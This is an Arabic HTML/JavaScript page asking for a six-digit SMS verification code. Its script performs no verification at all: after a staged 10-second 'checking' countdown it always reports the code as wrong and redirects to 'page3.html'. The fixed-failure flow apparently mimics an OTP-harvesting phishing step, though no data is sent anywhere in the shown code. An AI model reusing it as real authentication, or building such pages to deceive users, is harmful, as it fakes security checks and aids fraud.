<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الرمز - OTP</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-blue: #007aff;
            --bg-color: #f5f7fa;
            --text-dark: #1a202c;
            --error-color: #dc3545;
        }

        body {
            background-color: var(--bg-color);
            font-family: 'Cairo', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .otp-card {
            background: white;
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }

        .icon-box {
            font-size: 50px;
            margin-bottom: 20px;
        }

        h2 {
            color: var(--text-dark);
            margin-bottom: 10px;
            font-size: 24px;
        }

        p {
            color: #718096;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .otp-inputs {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            direction: ltr;
            margin-bottom: 30px;
        }

        .otp-inputs input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            background: #fff;
            transition: all 0.2s ease;
            outline: none;
        }

        .otp-inputs input:focus {
            border-color: var(--primary-blue);
            box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.1);
        }

        .verify-btn {
            width: 100%;
            background-color: var(--primary-blue);
            color: white;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.3s;
        }

        .verify-btn:disabled {
            background-color: #cbd5e0;
            cursor: not-allowed;
        }

        .resend-text {
            margin-top: 20px;
            font-size: 14px;
            color: #718096;
        }

        .resend-link {
            color: var(--primary-blue);
            text-decoration: none;
            font-weight: bold;
        }

        .verification-message {
            background: rgba(251, 191, 36, 0.15);
            border: 1px solid #f59e0b;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            text-align: center;
            display: none;
        }

        .verification-icon {
            font-size: 36px;
            color: #f59e0b;
            margin-bottom: 10px;
        }

        .error-message {
            background: rgba(220, 53, 69, 0.15);
            border: 1px solid var(--error-color);
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            text-align: center;
            display: none;
        }

        .error-icon {
            font-size: 36px;
            color: var(--error-color);
            margin-bottom: 10px;
        }

        .countdown {
            font-size: 24px;
            font-weight: bold;
            color: var(--error-color);
            margin: 15px 0;
            display: none;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

<div class="otp-card">
    <div class="icon-box">✉️</div>
    <h2>رمز التحقق</h2>
    <p>لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك المسجل لدينا، يرجى إدخاله للمتابعة.</p>

    <form id="otpForm">
        <div class="otp-inputs" id="otp-inputs">
            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
        </div>

        <button type="submit" class="verify-btn" id="verify-btn">تأكيد الرمز</button>
    </form>

    <div class="resend-text">
        لم يصلك الرمز؟ <a href="#" class="resend-link" id="resend-link">إعادة إرسال (60ث)</a>
    </div>

    <div class="verification-message" id="verificationMessage">
        <div class="verification-icon">⏳</div>
        <h3>جارٍ التحقق من المعلومات...</h3>
        <p>يرجى الانتظار بينما نقوم بالتحقق من صحة البيانات المدخلة</p>
        <div class="countdown" id="countdown">10</div>
    </div>

    <div class="error-message" id="errorMessage">
        <div class="error-icon">❌</div>
        <h3>خطأ في التحقق</h3>
        <p>المعلومات المدخلة غير صحيحة. يرجى المحاولة مرة أخرى.</p>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const inputs = document.querySelectorAll('#otp-inputs input');
    const otpForm = document.getElementById('otpForm');
    const verifyBtn = document.getElementById('verify-btn');
    const verificationMessage = document.getElementById('verificationMessage');
    const errorMessage = document.getElementById('errorMessage');
    const countdownElement = document.getElementById('countdown');
    const otpInputsContainer = document.querySelector('.otp-inputs');
    const resendSection = document.querySelector('.resend-text');
    let countdownInterval;
    
    // تفعيل التنقل بين حقول OTP
    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            const value = e.data || '';
            if (/^\d$/.test(value) && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                inputs[index - 1].focus();
            }
        });
        
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            if (/^\d{6}$/.test(paste)) {
                paste.split('').forEach((char, i) => {
                    if (inputs[i]) {
                        inputs[i].value = char;
                    }
                });
                inputs[5].focus();
            }
        });
    });
    
    // معالجة إرسال النموذج
    otpForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // جمع قيم OTP
        const otpValues = Array.from(inputs).map(input => input.value);
        const otpCode = otpValues.join('');
        
        // التحقق من إدخال جميع الأرقام
        if (otpValues.some(value => !value) || otpCode.length !== 6) {
            alert('❌ يرجى إدخال جميع أرقام رمز التحقق (6 أرقام)');
            return;
        }
        
        if (!/^\d{6}$/.test(otpCode)) {
            alert('❌ الرمز يجب أن يتكون من أرقام فقط');
            return;
        }
        
        // إخفاء حقول الإدخال والزر وإظهار رسالة التحقق
        otpInputsContainer.classList.add('hidden');
        verifyBtn.classList.add('hidden');
        resendSection.classList.add('hidden');
        verificationMessage.style.display = 'block';
        
        // بدء العد التنازلي
        let counter = 10;
        countdownElement.textContent = counter;
        
        countdownInterval = setInterval(() => {
            counter--;
            countdownElement.textContent = counter;
            
            if (counter <= 0) {
                clearInterval(countdownInterval);
                
                // إخفاء رسالة التحقق وإظهار رسالة الخطأ
                verificationMessage.style.display = 'none';
                errorMessage.style.display = 'block';
                
                // التحويل التلقائي بعد ثانيتين
                setTimeout(() => {
                    window.location.href = 'page3.html?error=invalid_information';
                }, 2000);
            }
        }, 1000);
    });
    
    // إعادة تعيين الصفحة عند التحميل
    window.addEventListener('load', function() {
        if (new URLSearchParams(window.location.search).has('error')) {
            // يمكن إضافة معالجة لرسالة الخطأ هنا إذا أردت
        }
    });
});
</script>

</body>
</html>
